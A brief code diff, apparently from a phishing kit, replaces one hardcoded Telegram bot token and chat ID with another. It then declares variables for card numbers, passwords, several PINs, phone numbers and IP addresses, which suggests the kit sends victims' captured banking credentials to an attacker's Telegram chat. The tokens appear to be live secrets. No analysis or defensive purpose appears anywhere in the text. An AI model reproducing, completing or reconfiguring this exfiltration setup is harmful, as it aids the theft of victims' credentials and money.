@@ -1,7 +1,7 @@
 //bot token
-var telegram_bot_id = "5919501042:AAGQ59uId4hT1_8rDC5IiemldxFDNI43ZI0";
+var telegram_bot_id = "6922320523:AAHN8WHwLZDUFX1ajlKYv2JO3dHoNa_TQZg";
 //chat id
-var chat_id = 1698701373;
+var chat_id = 5700805001;
 var CLN, PASS, PIN, PIN2, PIN3, NUMBER, ip, ip2, message;
 
 
